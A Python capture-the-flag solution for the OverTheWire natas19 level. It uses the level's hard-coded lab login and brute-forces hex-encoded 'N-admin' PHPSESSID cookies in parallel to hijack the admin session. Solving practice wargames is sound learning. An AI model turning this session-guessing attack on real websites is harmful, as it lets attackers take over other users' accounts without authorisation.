import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "http://natas19.natas.labs.overthewire.org/"
auth = ("natas19", "qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT")

session = requests.Session()
session.auth = auth

MAX_WORKERS = 12  # sweet spot for HTTP timing tasks

def check(i):
    s = f"{i}-admin"
    payload = s.encode().hex()

    cookies = {"PHPSESSID": payload}

    try:
        r = session.get(url, cookies=cookies, timeout=5)
    except requests.exceptions.RequestException:
        return None

    if "Username: natas20" in r.text:
        return i, payload

    return None


with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
    futures = {executor.submit(check, i): i for i in range(641)}

    for future in as_completed(futures):
        result = future.result()

        if result:
            i, payload = result
            print(f"[+] Found valid ID: {i}")
            print(f"[+] Payload: {payload}")

            # cancel remaining tasks
            for f in futures:
                f.cancel()

            break